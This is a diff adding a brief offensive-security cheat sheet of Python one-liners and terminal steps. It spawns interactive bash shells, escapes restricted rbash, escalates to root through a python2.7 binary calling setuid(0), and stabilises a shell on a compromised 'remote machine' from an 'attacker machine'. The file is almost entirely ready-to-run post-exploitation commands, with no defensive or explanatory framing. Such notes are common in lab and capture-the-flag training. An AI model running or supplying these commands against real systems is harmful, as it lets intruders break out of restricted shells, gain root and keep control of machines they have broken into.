@@ -1,0 +1,37 @@
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+**********************************************
+
+ESCAPING RBASH
+
+python3 -c 'import os; os.system("/bin/sh");'
+
+**********************************************
+
+PRIV ESC PYTHON 2.7
+
+/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+
+
+******SHELL STABILIZATION*******
+
+FOR LINUX
+
+On the remote machine, run 
+1.    python -c 'import pty; pty.spawn("/bin/bash")' 
+2.   press CTRL-z to put the session to the background.
+Then on attacker machine run 
+3.   stty -a 
+Note the rows and columns (say they are 40 and 160 respectively for me!).
+Now run,
+4.   stty raw -echo ; fg
+Press enter twice
+now run,
+5.   export TERM=xterm
+use xterm-256color/xterm
+After that, run 
+6.   stty rows 40 columns 160 
+to specify the correct size. 
+You should now have a fully working shell, in particular vi/nano should work.
